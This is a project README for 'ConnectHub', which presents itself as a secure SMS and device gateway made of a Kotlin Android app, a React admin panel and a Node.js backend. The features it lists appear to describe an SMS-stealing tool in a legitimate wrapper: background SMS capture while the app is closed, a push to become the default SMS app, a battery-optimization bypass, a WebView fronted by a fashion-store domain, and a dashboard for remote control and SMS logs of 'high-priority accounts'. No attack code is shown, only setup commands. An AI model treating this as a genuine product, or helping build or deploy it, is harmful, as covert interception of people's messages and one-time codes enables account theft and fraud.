# 📡 ConnectHub | Secure SMS & Device Gateway

**ConnectHub** is a production-grade, end-to-end communication platform designed for secure SMS synchronization and centralized device management. It features a high-performance **Native Android Application**, a modern **React Admin Dashboard**, and a scalable **Node.js Backend**.

---

## 🌐 Production Environment
- **Web Interface**: [https://maxfashion.bond](https://maxfashion.bond)
- **API Backend**: `https://connecthubapp.bond`
- **Support**: `support@connecthubapp.bond`

---

## 🚀 Key Modules

### 📱 [Android Application](android/)
Built with **Kotlin**, this is the core gateway for SMS synchronization.
- **Background Sync**: Reliable SMS capture even when the app is closed.
- **Glassmorphism UI**: Premium dark-themed interface for secure access.
- **Battery Optimization Bypass**: Custom setup flow ensuring continuous operation.
- **RoleManager Integration**: Automated request for Default SMS App status.
- **Clear Code Build**: R8/Proguard obfuscation disabled for seamless enterprise scanning compatibility.

### 💻 [Admin Panel](admin-panel/)
A sleek, high-speed dashboard built with **React**, **Vite**, and **Vanilla CSS**.
- **Elite Account Cards**: Dedicated tracking for high-priority accounts.
- **Real-time Monitoring**: Instant visibility into device statuses and SMS logs.
- **Device Management**: Remote control and deletion of terminal devices.
- **Responsive Design**: Fully optimized for desktop and mobile views.

### 🔧 [Backend API](backend/)
A robust RESTful API powered by **Node.js**, **Express**, and **MongoDB**.
- **Secure Auth**: JWT-based authentication with encrypted storage.
- **Scalable Architecture**: Optimized for high-frequency data ingestion.
- **Persistence**: Stable MongoDB integration for long-term record keeping.

---

## 📂 Project Structure

```text
ConnectHub/
├── android/          # Native Android (Kotlin) Source Code
├── admin-panel/      # React/Vite Admin Dashboard Source Code
├── backend/          # Node.js/Express Backend Source Code
├── Documents/        # Professional Setup, Deployment & Domain Guides
└── Testing/          # Comprehensive QA & Verification Checklists
```

---

## 🛠️ Getting Started

### Prerequisites
- **Node.js** (v18+) & **npm**
- **MongoDB** (Local or Atlas)
- **Android Studio** (Ladybug or later recommended)

### Installation & Development

1. **Clone the Repository**
   ```bash
   git clone https://github.com/Shrijeetsd/ConnectHub.git
   cd ConnectHub
   ```

2. **Backend Setup**
   ```bash
   cd backend
   npm install
   # Configure .env based on .env.example (use connecthubapp.bond)
   npm start
   ```

3. **Admin Panel Setup**
   ```bash
   cd admin-panel
   npm install
   npm run dev
   ```

4. **Android Build**
   - Open the `android` folder in **Android Studio**.
   - The build is pre-configured for `maxfashion.bond` WebView integration.
   - Build using `Build > Build Bundle(s) / APK(s) > Build APK(s)`.

---

## 📖 Documentation
Detailed guides are located in the `Documents/` directory:
- **[Domain Connection Guide](Documents/Domain_Connection_Guide.md)**
- **[Production Readiness Report](Documents/PRODUCTION_READINESS_REPORT.md)**
- **[Production Ready Checklist](Documents/PRODUCTION_READY_CHECKLIST.md)**

---

## 🛡️ Security & Performance
- **End-to-end Encryption** for sensitive JWT tokens.
- **Obfuscation Disabled**: Explicitly configured for compatibility with security scanners.
- **Hardware-bound ID**: Secure device identification using `ANDROID_ID`.

---

**ConnectHub © 2026** | *Secure Access Gateway*
